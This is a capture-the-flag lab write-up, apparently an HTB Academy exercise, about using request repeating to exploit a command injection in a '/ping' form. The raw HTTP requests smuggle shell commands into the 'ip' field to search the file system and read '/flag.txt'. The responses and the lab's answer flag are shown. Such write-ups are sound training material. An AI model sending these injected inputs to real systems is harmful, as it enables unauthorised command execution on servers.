# Repeating Requests
## Questions
1. Try using request repeating to be able to quickly test commands. With that, try looking for the other flag. **Answer:**
   - First find the other flag file → located at `/flag.txt`:
    ```
    POST /ping HTTP/1.1
    Host: 154.57.164.81:30781
    Content-Length: 28
    Cache-Control: max-age=0
    Accept-Language: en-US,en;q=0.9
    Origin: http://154.57.164.81:30781
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://154.57.164.81:30781/
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive

    ip=1; find / -name '*flag*';
    ```
    ```
    HTTP/1.1 200 OK
    X-Powered-By: Express
    Date: Thu, 07 May 2026 08:54:32 GMT
    Connection: keep-alive
    Content-Length: 1367

    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms

    --- 127.0.0.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 0.072/0.072/0.072/0.000 ms
    /proc/sys/kernel/acpi_video_flags
    /proc/sys/net/ipv4/fib_notify_on_flag_change
    /proc/sys/net/ipv6/conf/all/ra_honor_pio_pflag
    /proc/sys/net/ipv6/conf/default/ra_honor_pio_pflag
    /proc/sys/net/ipv6/conf/eth0/ra_honor_pio_pflag
    /proc/sys/net/ipv6/conf/ip6tnl0/ra_honor_pio_pflag
    /proc/sys/net/ipv6/conf/lo/ra_honor_pio_pflag
    /proc/sys/net/ipv6/conf/sit0/ra_honor_pio_pflag
    /proc/sys/net/ipv6/fib_notify_on_flag_change
    /proc/kpageflags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
    /sys/devices/virtual/net/ip6tnl0/flags
    /sys/devices/virtual/net/tunl0/flags
    /sys/devices/virtual/net/sit0/flags
    /sys/devices/virtual/net/lo/flags
    /sys/devices/virtual/net/eth0/flags
    /sys/module/scsi_mod/parameters/default_dev_flags
    /usr/lib/x86_64-linux-gnu/perl/5.30.0/bits/ss_flags.ph
    /usr/lib/x86_64-linux-gnu/perl/5.30.0/bits/waitflags.ph
    /var/www/html/flag.txt
    /flag.txt
    ```
   - Read the flag:
    ```
    POST /ping HTTP/1.1
    Host: 154.57.164.81:30781
    Content-Length: 20
    Cache-Control: max-age=0
    Accept-Language: en-US,en;q=0.9
    Origin: http://154.57.164.81:30781
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://154.57.164.81:30781/
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive

    ip=1; cat /flag.txt;
    ```
    ```
    HTTP/1.1 200 OK
    X-Powered-By: Express
    Date: Thu, 07 May 2026 08:58:57 GMT
    Connection: keep-alive
    Content-Length: 283

    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms

    --- 127.0.0.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
    HTB{qu1ckly_r3p3471n6_r3qu3575}
    ```